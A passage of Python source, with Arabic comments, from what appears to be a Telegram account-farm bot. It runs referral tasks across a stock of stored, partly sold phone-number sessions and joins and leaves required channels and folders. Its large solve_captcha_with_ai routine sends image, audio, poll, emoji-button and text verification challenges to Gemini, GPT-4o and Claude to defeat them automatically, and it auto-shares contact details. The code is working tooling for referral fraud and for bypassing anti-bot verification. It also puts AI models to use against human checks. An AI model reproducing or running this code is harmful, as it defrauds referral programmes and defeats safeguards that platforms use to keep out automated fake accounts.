        c.execute("DELETE FROM referral_tasks WHERE id=%s", (task_id,))

def toggle_referral_task(task_id: int) -> bool:
    """يعكس حالة التفعيل ويُرجع الحالة الجديدة (True=نشط)."""
    with db_conn() as c:
        row = c.execute("SELECT active FROM referral_tasks WHERE id=%s", (task_id,)).fetchone()
        if not row:
            return False
        new_val = 0 if row["active"] else 1
        c.execute("UPDATE referral_tasks SET active=%s WHERE id=%s", (new_val, task_id))
        return bool(new_val)

def get_referral_task_stats(task_id: int) -> dict:
    """يُرجع إحصاء: done / failed / pending / total لمهمة إحالة معيّنة."""
    with db_conn() as c:
        rows = c.execute(
            "SELECT status, COUNT(*) as cnt FROM referral_completions WHERE task_id=%s GROUP BY status",
            (task_id,)
        ).fetchall()
        stats = {"done": 0, "failed": 0, "pending": 0}
        for r in rows:
            stats[r["status"]] = r["cnt"]
        stats["total"] = sum(stats.values())
        return stats

def get_pending_numbers_for_task(task_id: int) -> list:
    """أرقام المخزون التي لم تُكمل هذه المهمة بعد (لم تُسجَّل في referral_completions بحالة done).
    القيد الوحيد: استبعاد الحسابات المباعة (ever_sold IS TRUE).
    الأرقام بدون جلسة تُتجاوز وقت التشغيل ولا تُسجَّل كـ failed (تُعاد في الدورة التالية)."""
    with db_conn() as c:
        rows = c.execute(
            """
            SELECT ns.id, ns.phone_number, ns.session_string
            FROM number_stock ns
            WHERE ns.ever_sold IS NOT TRUE
              AND ns.id NOT IN (
                  SELECT stock_id FROM referral_completions
                  WHERE task_id=%s AND status='done'
              )
            ORDER BY ns.id ASC
            """,
            (task_id,)
        ).fetchall()
        return [dict(r) for r in rows]

def mark_referral_completion(task_id: int, stock_id: int, status: str, error_msg: str = None):
    with db_conn() as c:
        c.execute(
            """
            INSERT INTO referral_completions (task_id, stock_id, status, done_at, error_msg)
            VALUES (%s, %s, %s, NOW(), %s)
            ON CONFLICT (task_id, stock_id) DO UPDATE
              SET status=EXCLUDED.status, done_at=EXCLUDED.done_at, error_msg=EXCLUDED.error_msg
            """,
            (task_id, stock_id, status, error_msg)
        )

# ═══════════════════════════════════════════════════════════
# ═══════════════════════════════════════════════════════════

# ─── دوال مساعدة للإحالة التلقائية ───

def _parse_channel_tokens(raw: str) -> list:
    """يحوّل نص القنوات (مسافة / سطر جديد فاصل) إلى قائمة من dict {type, value}.
    يقبل: @username  أو  t.me/username  أو  t.me/+HASH  أو  t.me/joinchat/HASH
    """
    import re as _re
    results = []
    for tok in _re.split(r'[\s,]+', raw.strip()):
        tok = tok.strip()
        if not tok:
            continue
        if 't.me/' in tok or 'telegram.me/' in tok:
            from urllib.parse import urlparse as _up, parse_qs as _pq
            parsed = _up(tok if tok.startswith('http') else 'https://' + tok)
            path = parsed.path.strip('/')
            if path.startswith('+'):
                results.append({'type': 'invite', 'value': path[1:]})
            elif 'joinchat/' in path:
                results.append({'type': 'invite', 'value': path.split('joinchat/')[-1]})
            else:
                part = path.split('/')[0]
                if part:
                    results.append({'type': 'username', 'value': part})
        elif tok.startswith('@'):
            results.append({'type': 'username', 'value': tok[1:]})
        else:
            results.append({'type': 'username', 'value': tok})
    return results

async def _join_mandatory_channels(client, raw_channels: str) -> int:
    """ينضم لجميع القنوات الإجبارية. يُرجع عدد ما نجح."""
    from telethon.tl.functions.channels import JoinChannelRequest
    from telethon.tl.functions.messages import ImportChatInviteRequest
    tokens = _parse_channel_tokens(raw_channels)
    joined = 0
    for tok in tokens:
        try:
            if tok['type'] == 'invite':
                await client(ImportChatInviteRequest(tok['value']))
            else:
                ch = await client.get_entity(tok['value'])
                await client(JoinChannelRequest(ch))
            joined += 1
            await asyncio.sleep(1.5)
        except Exception as e:
            logger.warning(f"⚠️ تعذّر الانضمام لـ {tok}: {e}")
    return joined

async def _leave_mandatory_channels(client, raw_channels: str) -> int:
    """يغادر جميع القنوات الإجبارية بعد اكتمال العملية. يُرجع عدد ما نجح."""
    from telethon.tl.functions.channels import LeaveChannelRequest
    tokens = _parse_channel_tokens(raw_channels)
    left = 0
    for tok in tokens:
        try:
            ch = await client.get_entity(tok['value'])
            await client(LeaveChannelRequest(ch))
            left += 1
            await asyncio.sleep(1.0)
        except Exception as e:
            logger.warning(f"⚠️ تعذّر مغادرة {tok}: {e}")
    return left

async def _join_folder_link(client, folder_url: str) -> str:
    """ينضم لمجلد تيليجرام (addlist link). إذا وصل الحد (2) يحذف الأقدم."""
    try:
        from telethon.tl.functions.chatlists import (
            CheckChatlistInviteRequest,
            JoinChatlistInviteRequest,
            GetChatlistsRequest,
            LeaveChatlistRequest,
        )
        import re as _re
        m = _re.search(r'addlist/([A-Za-z0-9_-]+)', folder_url)
        if not m:
            return "رابط مجلد غير صحيح"
        folder_hash = m.group(1)

        try:
            current = await client(GetChatlistsRequest())
            folders = getattr(current, 'filters', []) or []
        except Exception:
            folders = []

        if len(folders) >= 2:
            try:
                oldest = folders[0]
                await client(LeaveChatlistRequest(
                    chatlist=oldest,
                    peers=[]
                ))
                await asyncio.sleep(1)
            except Exception as e:
                logger.warning(f"⚠️ تعذّر حذف مجلد قديم: {e}")

        invite_info = await client(CheckChatlistInviteRequest(slug=folder_hash))
        await client(JoinChatlistInviteRequest(
            slug=folder_hash,
            peers=getattr(invite_info, 'peers', []) or [],
        ))
        return "انضم للمجلد ✅"
    except Exception as e:
        logger.warning(f"⚠️ تعذّر الانضمام للمجلد: {e}")
        return f"فشل المجلد: {str(e)[:60]}"

async def solve_captcha_with_ai(client, bot_entity, msgs: list, phone: str = "", max_rounds: int = 6) -> tuple:
    """
    نظام شامل متعدد الذكاء الاصطناعي لحل جميع أنواع التحقق في بوتات تيليغرام.
    سلسلة الذكاء: Gemini 2.0 Flash → Gemini 1.5 Pro → OpenAI GPT-4o → Claude 3.5 Sonnet
    الأنواع المدعومة:
      ① صورة CAPTCHA (نص مشوّه)       ② صوت/رسالة صوتية (audio captcha)
      ③ سؤال نصي / رياضي             ④ إيموجي من أزرار
      ⑤ Poll / Quiz                  ⑥ مشاركة جهة اتصال
      ⑦ ردود فعل (Reactions)         ⑧ أزرار URL / Web App
      ⑨ QR Code (قراءة محتواه)       ⑩ أي تحقق غير معروف (Universal AI)
    يُرجع (solved: bool, detail: str).
    """
    import base64 as _b64

    # ════════════════════════════════════════════════════════════
    # ── مفاتيح الذكاء الاصطناعي ──────────────────────────────
    # ════════════════════════════════════════════════════════════
    GEMINI_KEY      = os.environ.get("GEMINI_API_KEY",    "")
    OPENAI_KEY      = os.environ.get("OPENAI_API_KEY",    "")
    ANTHROPIC_KEY   = os.environ.get("ANTHROPIC_API_KEY", "")
    GEMINI_FLASH    = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key={GEMINI_KEY}"
    GEMINI_PRO      = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-pro:generateContent?key={GEMINI_KEY}"

    # ════════════════════════════════════════════════════════════
    # ── كلمات دلالية موسّعة ──────────────────────────────────
    # ════════════════════════════════════════════════════════════
    SUCCESS_KW = [
        "✅", "تم", "نجح", "مبروك", "أهلاً", "مرحباً", "welcome", "success",
        "تم التحقق", "مقبول", "accepted", "verified", "شكراً", "برافو",
        "اشتركت", "سجلت", "تسجيل", "دخلت", "ترحيب", "congratulations",
        "passed", "اجتزت", "صحيح", "correct", "ممتاز", "👍", "تم قبولك",
        "تم التسجيل", "انتهت عملية", "تم التفعيل", "بنجاح", "welcome",
        "أهلا وسهلا", "تمت العملية", "مرحب", "تم إضافتك", "تم قبولك",
    ]
    FAIL_KW = [
        "خطأ", "غلط", "wrong", "incorrect", "فشل", "error", "❌",
        "حاول مجدداً", "try again", "retry", "invalid", "غير صحيح",
        "أعد", "مجدداً", "again", "حاول ثانية", "إجابة خاطئة", "لا يطابق",
    ]
    CAPTCHA_KW = [
        "تحقق", "verify", "captcha", "اضغط", "ادخل", "أجب", "اختر",
        "robot", "بشر", "human", "confirm", "verification", "كابتشا",
        "لست روبوت", "لست بوت", "not a robot", "prove", "إثبت",
        "تأكيد", "تحديد", "ليس روبوت", "اثبت", "أنت إنسان", "human check",
        "security check", "فحص", "اختبار", "quiz", "puzzle", "riddle",
        "انتبه", "مهمة", "mission", "task", "challenge", "أكمل",
    ]
    MATH_KW = [
        "=", "؟", "?", "كم", "احسب", "حل", "اكتب", "أدخل",
        "اجمع", "اطرح", "اضرب", "اقسم", "ناتج", "حاصل", "result",
        "calculate", "solve", "answer", "الإجابة", "الجواب", "الرقم",
        "+", "-", "×", "÷", "*", "/", "^", "sqrt", "جذر",
    ]
    FORWARD_KW = [
        "شارك", "أرسل ملف", "ارسل ملف", "forward", "ملفك الشخصي",
        "profile", "بروفايل", "contact", "جهة اتصال", "رقمك",
        "رقم هاتفك", "شارك ملفك", "ارسل بياناتك", "بياناتك الشخصية",
        "share contact", "send contact", "phone number",
    ]
    REACTION_KW = [
        "تفاعل", "react", "reaction", "اضغط على", "ارسل إيموجي",
        "أرسل إيموجي", "انقر", "إيموجي", "emoji", "رد بـ", "reply with",
        "أرسل رد", "ارسل رد", "like", "press emoji", "click emoji",
    ]

    def _extract_emojis(text: str) -> list:
        """يستخرج جميع الإيموجيات من أي نص."""
        out = []
        for ch in text:
            cp = ord(ch)
            if (0x1F300 <= cp <= 0x1FFFF or 0x2600 <= cp <= 0x27BF or
                    0x1F900 <= cp <= 0x1F9FF or 0x1FA00 <= cp <= 0x1FAFF):
                out.append(ch)
        return out

    def _is_success(text: str) -> bool:
        t = (text or "").lower()
        return any(k.lower() in t for k in SUCCESS_KW)

    def _is_fail(text: str) -> bool:
        t = (text or "").lower()
        return any(k.lower() in t for k in FAIL_KW)

    # ════════════════════════════════════════════════════════════
    # ── محركات AI متعددة — نص ────────────────────────────────
    # ════════════════════════════════════════════════════════════
    async def _gemini_call(url: str, parts: list) -> str | None:
        def _req():
            r = requests.post(url, json={"contents": [{"parts": parts}]}, timeout=30)
            if r.status_code == 200:
                return r.json()["candidates"][0]["content"]["parts"][0]["text"].strip()
            logger.debug(f"Gemini {r.status_code}: {r.text[:200]}")
            return None
        try:
            return await asyncio.to_thread(_req)
        except Exception as _e:
            logger.debug(f"Gemini call error: {_e}")
        return None

    async def _openai_call(prompt: str, img_b64: str | None = None, mime: str = "image/jpeg") -> str | None:
        if not OPENAI_KEY:
            return None
        def _req():
            content: list = [{"type": "text", "text": prompt}]
            if img_b64:
                content.append({"type": "image_url", "image_url": {"url": f"data:{mime};base64,{img_b64}"}})
            r = requests.post(
                "https://api.openai.com/v1/chat/completions",
                headers={"Authorization": f"Bearer {OPENAI_KEY}", "Content-Type": "application/json"},
                json={"model": "gpt-4o", "messages": [{"role": "user", "content": content}], "max_tokens": 200},
                timeout=35,
            )
            if r.status_code == 200:
                return r.json()["choices"][0]["message"]["content"].strip()
            logger.debug(f"OpenAI {r.status_code}: {r.text[:200]}")
            return None
        try:
            return await asyncio.to_thread(_req)
        except Exception as _e:
            logger.debug(f"OpenAI error: {_e}")
        return None

    async def _claude_call(prompt: str, img_b64: str | None = None, mime: str = "image/jpeg") -> str | None:
        if not ANTHROPIC_KEY:
            return None
        def _req():
            content: list = []
            if img_b64:
                content.append({"type": "image", "source": {"type": "base64", "media_type": mime, "data": img_b64}})
            content.append({"type": "text", "text": prompt})
            r = requests.post(
                "https://api.anthropic.com/v1/messages",
                headers={
                    "x-api-key": ANTHROPIC_KEY,
                    "anthropic-version": "2023-06-01",
                    "Content-Type": "application/json",
                },
                json={"model": "claude-3-5-sonnet-20241022", "max_tokens": 200,
                      "messages": [{"role": "user", "content": content}]},
                timeout=35,
            )
            if r.status_code == 200:
                return r.json()["content"][0]["text"].strip()
            logger.debug(f"Claude {r.status_code}: {r.text[:200]}")
            return None
        try:
            return await asyncio.to_thread(_req)
        except Exception as _e:
            logger.debug(f"Claude error: {_e}")
        return None

    async def _ai_text(prompt: str, tried: set | None = None) -> str | None:
        """يُرسل السؤال لجميع AI بالتتابع حتى يحصل على إجابة."""
        tried = tried or set()
        if GEMINI_KEY and "gemini_flash" not in tried:
            ans = await _gemini_call(GEMINI_FLASH, [{"text": prompt}])
            if ans:
                logger.info(f"🤖 Gemini Flash text → '{ans[:60]}' ({phone})")
                return ans
        if GEMINI_KEY and "gemini_pro" not in tried:
            ans = await _gemini_call(GEMINI_PRO, [{"text": prompt}])
            if ans:
                logger.info(f"🤖 Gemini Pro text → '{ans[:60]}' ({phone})")
                return ans
        if OPENAI_KEY and "openai" not in tried:
            ans = await _openai_call(prompt)
            if ans:
                logger.info(f"🤖 GPT-4o text → '{ans[:60]}' ({phone})")
                return ans
        if ANTHROPIC_KEY and "claude" not in tried:
            ans = await _claude_call(prompt)
            if ans:
                logger.info(f"🤖 Claude text → '{ans[:60]}' ({phone})")
                return ans
        return None

    async def _ai_vision(prompt: str, media_bytes: bytes, mime: str = "image/jpeg") -> str | None:
        """يُرسل الصورة/الوسائط لجميع AI بالتتابع."""
        b64 = _b64.b64encode(media_bytes).decode()
        # Gemini Flash
        if GEMINI_KEY:
            ans = await _gemini_call(GEMINI_FLASH, [
                {"text": prompt},
                {"inlineData": {"mimeType": mime, "data": b64}},
            ])
            if ans:
                logger.info(f"🤖 Gemini Flash vision → '{ans[:60]}' ({phone})")
                return ans
            # Gemini Pro fallback
            ans = await _gemini_call(GEMINI_PRO, [
                {"text": prompt},
                {"inlineData": {"mimeType": mime, "data": b64}},
            ])
            if ans:
                logger.info(f"🤖 Gemini Pro vision → '{ans[:60]}' ({phone})")
                return ans
        # OpenAI GPT-4o
        if OPENAI_KEY:
            ans = await _openai_call(prompt, img_b64=b64, mime=mime)
            if ans:
                logger.info(f"🤖 GPT-4o vision → '{ans[:60]}' ({phone})")
                return ans
        # Claude
        if ANTHROPIC_KEY:
            ans = await _claude_call(prompt, img_b64=b64, mime=mime)
            if ans:
                logger.info(f"🤖 Claude vision → '{ans[:60]}' ({phone})")
                return ans
        return None

    async def _ai_audio(audio_bytes: bytes) -> str | None:
        """يحاول قراءة كود من رسالة صوتية (audio captcha)."""
        # Gemini يفهم الصوت عبر inlineData
        if GEMINI_KEY:
            prompt = (
                "هذه رسالة صوتية من بوت تيليغرام تحتوي على كود أو أرقام للتحقق. "
                "اكتب فقط ما سمعته من أرقام أو كلمات بدون أي شرح إضافي."
            )
            b64 = _b64.b64encode(audio_bytes).decode()
            ans = await _gemini_call(GEMINI_FLASH, [
                {"text": prompt},
                {"inlineData": {"mimeType": "audio/ogg", "data": b64}},
            ])
            if ans:
                return ans
            ans = await _gemini_call(GEMINI_PRO, [
                {"text": prompt},
                {"inlineData": {"mimeType": "audio/ogg", "data": b64}},
            ])
            if ans:
                return ans
        # OpenAI Whisper
        if OPENAI_KEY:
            def _whisper():
                import io
                r = requests.post(
                    "https://api.openai.com/v1/audio/transcriptions",
                    headers={"Authorization": f"Bearer {OPENAI_KEY}"},
                    files={"file": ("audio.ogg", io.BytesIO(audio_bytes), "audio/ogg")},
                    data={"model": "whisper-1"},
                    timeout=30,
                )
                if r.status_code == 200:
                    return r.json().get("text", "").strip()
                return None
            try:
                return await asyncio.to_thread(_whisper)
            except Exception as _we:
                logger.debug(f"Whisper error: {_we}")
        return None

    # ════════════════════════════════════════════════════════════
    # ── ضغط الأزرار بذكاء (Callback / URL / WebApp) ──────────
    # ════════════════════════════════════════════════════════════
    async def _click_smart(btn) -> bool:
        burl  = getattr(btn, "url",  None) or ""
        bdata = getattr(btn, "data", None)
        # Callback button
        if bdata is not None:
            try:
                await btn.click()
                return True
            except Exception as _ce:
                logger.debug(f"callback click: {_ce}")
                return False
        # URL / WebApp
        if burl and "t.me/" not in burl and "telegram.me/" not in burl:
            try:
                from telethon.tl.functions.messages import RequestWebViewRequest
                import aiohttp as _ah
                try:
                    _wv = await asyncio.wait_for(client(RequestWebViewRequest(
                        peer=bot_entity, bot=bot_entity, platform="android", url=burl,
                    )), timeout=15)
                    _target = getattr(_wv, "url", None) or burl
                except Exception:
                    _target = burl
                _hdrs = {"User-Agent": "TelegramAndroid/10.14 (Samsung; Android 14)"}
                async with _ah.ClientSession() as _s:
                    async with _s.get(_target, headers=_hdrs,
                                      timeout=_ah.ClientTimeout(total=15),
                                      allow_redirects=True) as _r:
                        logger.info(f"🌐 URL/WebApp تحقق → status={_r.status} ({phone})")
                return True
            except Exception as _ue:
                logger.debug(f"URL click: {_ue}")
                return False
        # fallback
        try:
            await btn.click()
            return True
        except Exception:
            return False

    # ════════════════════════════════════════════════════════════
    # ── انتظار رد البوت وتحليله ──────────────────────────────
    # ════════════════════════════════════════════════════════════
    async def _wait_bot(secs: int = 4, limit: int = 5) -> tuple:
        await asyncio.sleep(secs)
        new_msgs = await asyncio.wait_for(client.get_messages(bot_entity, limit=limit), timeout=10)
        for m in new_msgs:
            t = getattr(m, "message", "") or getattr(m, "text", "") or ""
            if _is_success(t):
                return "success", new_msgs
            if _is_fail(t):
                return "fail", new_msgs
        return "unknown", new_msgs

    # ════════════════════════════════════════════════════════════
    # ── تأكّد من وجود مفتاح AI واحد على الأقل ────────────────
    # ════════════════════════════════════════════════════════════
    if not any([GEMINI_KEY, OPENAI_KEY, ANTHROPIC_KEY]):
        return False, "لا يوجد مفتاح AI (GEMINI_API_KEY / OPENAI_API_KEY / ANTHROPIC_API_KEY)"

    all_details: list[str] = []
    processed_ids: set[int] = set()
    _ai_failed_rounds: int = 0   # عدد مرات الفشل المتتالي — للتحكم في التوقف المبكر

    # ════════════════════════════════════════════════════════════
    # ── الحلقة الرئيسية (max_rounds جولات) ──────────────────
    # ════════════════════════════════════════════════════════════
    for _round in range(max_rounds):
        if _round > 0:
            await asyncio.sleep(3)
            msgs = await asyncio.wait_for(client.get_messages(bot_entity, limit=8), timeout=10)

        for msg in msgs:
            msg_id  = getattr(msg, "id", 0)
            if msg_id in processed_ids:
                continue

            msg_text  = getattr(msg, "message", "") or getattr(msg, "text", "") or ""
            msg_lower = msg_text.lower()
            has_photo = bool(getattr(msg, "photo", None))
            has_doc   = bool(getattr(msg, "document", None))
            has_voice = bool(getattr(msg, "voice", None)) or bool(getattr(msg, "audio", None))
            has_media = has_photo or has_doc
            has_btns  = bool(msg.buttons)
            has_poll  = bool(getattr(msg, "poll", None))

            # نجاح مبكر — رسالة ترحيب وصلت بعد حل سابق
            if _is_success(msg_text) and all_details:
                return True, f"نجح التحقق ✅ | {' | '.join(all_details)}"

            # ════════════════════════════════════════════════════
            # 1. رسالة صوتية / Audio CAPTCHA
            # ════════════════════════════════════════════════════
            if has_voice:
                try:
                    audio_bytes = await client.download_media(msg, bytes)
                    if audio_bytes:
                        answer = await _ai_audio(audio_bytes)
                        if answer:
                            # استخرج الأرقام/الكود فقط
                            nums = re.findall(r"[\d]+", answer)
                            send_ans = "".join(nums) if nums else answer.strip()
                            logger.info(f"🔊 Audio CAPTCHA → '{send_ans}' ({phone})")
                            processed_ids.add(msg_id)
                            await asyncio.sleep(1)
                            await client.send_message(bot_entity, send_ans)
                            result, msgs = await _wait_bot()
                            all_details.append(f"Audio: {send_ans}")
                            if result == "success":
                                return True, f"نجح التحقق ✅ | {' | '.join(all_details)}"
                            elif result == "fail":
                                break
                            else:
                                return True, f"أُرسل كود صوتي | {' | '.join(all_details)}"
                except Exception as _ae:
                    logger.warning(f"⚠️ Audio captcha ({phone}): {_ae}")
                continue

            # ════════════════════════════════════════════════════
            # 2. صورة CAPTCHA (نص مشوّه، QR، رياضيات، ألوان، أشكال)
            # ════════════════════════════════════════════════════
            if has_media:
                try:
                    media_bytes = await client.download_media(msg, bytes)
                    if not media_bytes:
                        continue
                    # اكتشف نوع الملف تلقائياً
                    mime = "image/jpeg"
                    if has_doc:
                        _mime_raw = getattr(getattr(msg.document, "mime_type", None), "__str__", lambda: "")() or ""
                        if _mime_raw:
                            mime = _mime_raw
                    prompt_img = (
                        "أنت خبير في حل اختبارات التحقق (CAPTCHA) في بوتات تيليغرام.\n"
                        f"رسالة البوت المرافقة: {msg_text or '(لا يوجد نص)'}\n\n"
                        "مهمتك: اقرأ هذه الصورة بدقة وأجب بما تراه:\n"
                        "• إذا كانت أرقام/حروف مشوّهة → اكتبها كما هي\n"
                        "• إذا كان QR Code → اقرأ محتواه\n"
                        "• إذا كانت معادلة رياضية → احسب الناتج\n"
                        "• إذا كانت أشكال/ألوان → اذكر ما يطلبه البوت\n"
                        "• أجب بكلمة واحدة أو رقم أو جملة قصيرة فقط بدون شرح."
                    )
                    answer = await _ai_vision(prompt_img, media_bytes, mime)
                    if answer:
                        send_ans = answer.strip()
                        logger.info(f"🖼 Image CAPTCHA → '{send_ans}' ({phone})")
                        processed_ids.add(msg_id)
                        await asyncio.sleep(1)
                        await client.send_message(bot_entity, send_ans)
                        result, msgs = await _wait_bot()
                        all_details.append(f"صورة: {send_ans}")
                        if result == "success":
                            return True, f"نجح التحقق ✅ | {' | '.join(all_details)}"
                        elif result == "fail":
                            # حاول بـ AI مختلف في الجولة القادمة
                            _ai_failed_rounds += 1
                            break
                        else:
                            return True, f"أُرسلت إجابة الصورة | {' | '.join(all_details)}"
                except Exception as _ie:
                    logger.warning(f"⚠️ Image captcha ({phone}): {_ie}")
                continue

            # ════════════════════════════════════════════════════
            # 3. مشاركة جهة اتصال / Contact
            # ════════════════════════════════════════════════════
            if any(k in msg_lower for k in FORWARD_KW):
                try:
                    from telethon.tl.types import InputMediaContact
                    me    = await client.get_me()
                    first = getattr(me, "first_name", "") or ""
                    last  = getattr(me, "last_name",  "") or ""
                    ph    = getattr(me, "phone",      "") or phone.lstrip("+")
                    if not ph.startswith("+"):
                        ph = "+" + ph
                    processed_ids.add(msg_id)
                    await client.send_file(bot_entity, InputMediaContact(
                        phone_number=ph, first_name=first, last_name=last, vcard="",
                    ))
                    result, msgs = await _wait_bot()
                    all_details.append("Contact sharing")
                    logger.info(f"📱 شارك جهة اتصال ({phone})")
                    if result == "success":
                        return True, f"نجح التحقق ✅ | {' | '.join(all_details)}"
                    elif result != "fail":
                        return True, f"أُرسل الملف الشخصي | {' | '.join(all_details)}"
                    continue
                except Exception as _ce2:
                    logger.warning(f"⚠️ Contact share ({phone}): {_ce2}")

            # ════════════════════════════════════════════════════
            # 4. Poll / Quiz
            # ════════════════════════════════════════════════════
            if has_poll:
                try:
                    poll_obj = msg.poll.poll
                    question = getattr(poll_obj, "question", "") or ""
                    answers  = [getattr(a, "text", "") for a in (getattr(poll_obj, "answers", []) or [])]
                    if question and answers:
                        prompt_poll = (
                            f"اختيار من متعدد — اختر الإجابة الصحيحة:\n"
                            f"السؤال: {question}\n"
                            + "\n".join(f"{i+1}. {a}" for i, a in enumerate(answers))
                            + "\n\nأجب برقم الخيار فقط (1 أو 2 أو 3...)."
                        )
                        ai_ans = await _ai_text(prompt_poll)
                        chosen_idx = 0
                        if ai_ans:
                            nums = re.findall(r"\d+", ai_ans)
                            if nums:
                                chosen_idx = min(max(0, int(nums[0]) - 1), len(answers) - 1)
                            else:
                                for i, a in enumerate(answers):
                                    if ai_ans.strip().lower() in a.lower():
                                        chosen_idx = i
                                        break
                        processed_ids.add(msg_id)
                        await msg.click(chosen_idx)
                        result, msgs = await _wait_bot()
                        all_details.append(f"Poll: {answers[chosen_idx]}")
                        logger.info(f"🗳 Poll → '{answers[chosen_idx]}' ({phone})")
                        if result == "success":
                            return True, f"نجح التحقق ✅ | {' | '.join(all_details)}"
                        elif result != "fail":
                            return True, f"أجاب Poll | {' | '.join(all_details)}"
                        continue
                except Exception as _pe:
                    logger.warning(f"⚠️ Poll captcha ({phone}): {_pe}")

            # ════════════════════════════════════════════════════
            # 5. أزرار (إيموجي / نص / URL / WebApp)
            # ════════════════════════════════════════════════════
            if has_btns:
                try:
                    btn_labels  = []
                    btn_objects = {}   # label → btn
                    url_btns    = {}   # label → btn (URL type, non-t.me)
                    for row in msg.buttons:
                        for btn in row:
                            label  = getattr(btn, "text", "") or ""
                            burl   = getattr(btn, "url",  None) or ""
                            is_channel_url = burl and ("t.me/" in burl or "telegram.me/" in burl)
                            if is_channel_url:
                                continue
                            if burl and label:
                                url_btns[label] = btn
                            if label:
                                btn_labels.append(label)
                                btn_objects[label] = btn

                    # ─── 5a. أزرار URL للتحقق (غير t.me) — اضغط مباشرة ──────
                    CHECK_BTN_KW = [
                        "تحقق", "verify", "check", "تأكيد", "confirm", "اشتركت",
                        "joined", "متابع", "تم", "done", "✅", "proceed", "continue",
                    ]
                    for label, btn in url_btns.items():
                        if any(k in label.lower() for k in CHECK_BTN_KW):
                            processed_ids.add(msg_id)
                            ok = await _click_smart(btn)
                            if ok:
                                result, msgs = await _wait_bot(secs=5)
                                all_details.append(f"URL-verify: {label}")
                                if result == "success":
                                    return True, f"نجح التحقق ✅ | {' | '.join(all_details)}"
                                elif result != "fail":
                                    return True, f"ضغط رابط تحقق | {' | '.join(all_details)}"

                    if not btn_labels:
                        continue

                    # ─── 5b. كشف مباشر للإيموجي المطلوب ──────────────────────
                    is_emoji_q = (
                        "correct emoji" in msg_lower or "select emoji" in msg_lower
                        or "choose emoji" in msg_lower or "pick emoji" in msg_lower
                        or "اختر الإيموجي" in msg_text or "الإيموجي الصحيح" in msg_text
                    )
                    direct_btn = None
                    if is_emoji_q:
                        msg_emojis = _extract_emojis(msg_text)
                        if msg_emojis:
                            for lbl, btn in btn_objects.items():
                                if msg_emojis[0] in lbl:
                                    direct_btn = btn
                                    logger.info(f"🎯 إيموجي مباشر '{msg_emojis[0]}' ({phone})")
                                    break
                            if not direct_btn:
                                for lbl, btn in btn_objects.items():
                                    if _extract_emojis(lbl) and _extract_emojis(lbl)[0] == msg_emojis[0]:
                                        direct_btn = btn
                                        break
                    if direct_btn:
                        processed_ids.add(msg_id)
                        await _click_smart(direct_btn)
                        result, msgs = await _wait_bot()
                        all_details.append(f"إيموجي مباشر: {getattr(direct_btn, 'text', '')}")
                        if result == "success":
                            return True, f"نجح التحقق ✅ | {' | '.join(all_details)}"
                        elif result == "fail":
                            break
                        else:
                            return True, f"ضغط إيموجي | {' | '.join(all_details)}"

                    # ─── 5c. هل هذه رسالة تحقق أصلاً؟ ──────────────────────
                    is_verif = (
                        any(k in msg_lower for k in CAPTCHA_KW)
                        or any(k in msg_lower for k in MATH_KW)
                        or any(k in msg_lower for k in REACTION_KW)
                        or "select" in msg_lower or "choose" in msg_lower
                        or "click" in msg_lower or "press" in msg_lower
                        or "pick" in msg_lower or len(btn_labels) >= 2
                    )
                    if not is_verif:
                        continue

                    # ─── 5d. AI يختار الزر الصحيح ────────────────────────────
                    all_emoji_btns = all(bool(_extract_emojis(lbl)) for lbl in btn_labels)
                    if all_emoji_btns:
                        prompt_btn = (
                            f"Telegram bot verification. Message:\n{msg_text}\n\n"
                            "Buttons:\n" + "\n".join(f"- {b}" for b in btn_labels)
                            + "\n\nWhich EXACT emoji button should be clicked? Reply with ONLY that emoji."
                        )
                    else:
                        prompt_btn = (
                            f"بوت تيليغرام يطلب التحقق. الرسالة:\n{msg_text}\n\n"
                            "الأزرار المتاحة:\n" + "\n".join(f"- {b}" for b in btn_labels)
                            + "\n\nأجب بنص الزر الصحيح فقط كما هو بالضبط."
                        )
                    ai_ans = await _ai_text(prompt_btn)
                    if ai_ans:
                        chosen = None
                        a_clean = ai_ans.strip()
                        a_lower = a_clean.lower()
                        # مطابقة دقيقة
                        for lbl, btn in btn_objects.items():
                            if lbl.strip() == a_clean:
                                chosen = btn; break
                        # مطابقة بالإيموجي
                        if not chosen:
                            ans_emojis = _extract_emojis(a_clean)
                            if ans_emojis:
                                for lbl, btn in btn_objects.items():
                                    if ans_emojis[0] in lbl:
                                        chosen = btn; break
                        # مطابقة نصية
                        if not chosen:
                            for lbl, btn in btn_objects.items():
                                if a_lower in lbl.lower() or lbl.lower() in a_lower:
                                    chosen = btn; break
                        if not chosen:
                            chosen = list(btn_objects.values())[0]
                        processed_ids.add(msg_id)
                        await _click_smart(chosen)
                        result, msgs = await _wait_bot()
                        all_details.append(f"زر: {getattr(chosen, 'text', '')}")
                        logger.info(f"🤖 AI اختار زر '{getattr(chosen, 'text', '')}' ({phone})")
                        if result == "success":
                            return True, f"نجح التحقق ✅ | {' | '.join(all_details)}"
                        elif result == "fail":
                            _ai_failed_rounds += 1
                            break
                        else:
                            return True, f"ضغط زر | {' | '.join(all_details)}"
                except Exception as _be:
                    logger.warning(f"⚠️ Button captcha ({phone}): {_be}")
                continue

            # ════════════════════════════════════════════════════
            # 6. سؤال نصي (رياضيات، أحاجي، إيموجي كرسالة)
            # ════════════════════════════════════════════════════
            if msg_text and not has_btns and not has_media and not has_poll and not has_voice:
                is_q = (
                    any(k in msg_lower for k in CAPTCHA_KW)
                    or any(k in msg_lower for k in MATH_KW)
                    or any(k in msg_lower for k in REACTION_KW)
                    or bool(_extract_emojis(msg_text))
                )
                if not is_q:
                    continue
                prompt_txt = (
                    f"بوت تيليغرام يطلب منك الإجابة للتحقق:\n{msg_text}\n\n"
                    "أجب بالإجابة الصحيحة فقط بدون أي شرح:\n"
                    "• إذا كان سؤالاً رياضياً → الرقم فقط\n"
                    "• إذا كان إيموجي → الإيموجي المطلوب فقط\n"
                    "• إذا كان سؤالاً نصياً → كلمة أو جملة قصيرة"
                )
                try:
                    answer = await _ai_text(prompt_txt)
                    if answer:
                        processed_ids.add(msg_id)
                        await asyncio.sleep(1)
                        await client.send_message(bot_entity, answer.strip())
                        result, msgs = await _wait_bot()
                        all_details.append(f"نص: {answer.strip()}")
                        logger.info(f"🤖 Text answer → '{answer.strip()}' ({phone})")
                        if result == "success":
                            return True, f"نجح التحقق ✅ | {' | '.join(all_details)}"
                        elif result == "fail":
                            _ai_failed_rounds += 1
                            break
                        else:
                            return True, f"أُرسلت إجابة | {' | '.join(all_details)}"
                except Exception as _te:
